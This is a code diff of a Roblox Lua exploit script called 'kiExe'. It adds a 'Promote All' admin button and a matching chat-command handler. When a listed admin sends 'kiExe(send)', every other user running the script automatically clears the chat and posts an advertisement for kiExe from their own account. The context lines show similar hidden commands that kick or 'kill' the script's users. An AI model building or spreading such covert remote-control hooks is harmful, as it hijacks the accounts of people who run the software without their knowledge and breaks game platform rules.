@@ -2632,6 +2632,16 @@ if findList(admins, LocalPlayer.Name) then
 	})
 
 	Tabs.Admin:AddButton({
+		Title = "Promote All",
+		Description = "Promote kiExe from all script user(s)",
+		Callback = function()
+			for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
+				game:GetService("Players"):Chat("kiExe(send)")
+			end
+		end
+	})
+
+	Tabs.Admin:AddButton({
 		Title = "Kill All",
 		Description = "Kill all script user(s)",
 		Callback = function()
@@ -2714,6 +2724,23 @@ local function onPlayerAdded(player)
 			end
 
 			LocalPlayer:Kick("kicked by kiExe administrator")
+		elseif message == "kiExe(send)" then
+			if not findList(admins, player.Name) then
+				return
+			end
+
+			if player.Name == LocalPlayer.Name then
+				return
+			end
+
+			local TextService = game:GetService("TextChatService")
+			local Channel = TextService.TextChannels:FindFirstChild("RBXGeneral")
+
+			if TextService and Channel then
+				Channel:SendAsync("/clear")
+				task.wait(2)
+				Channel:SendAsync("kiExe ON TOP! gg / kiexe")
+			end
 		elseif message == "kiExe(jumpscare)" then
 			if not findList(admins, player.Name) then
 				return
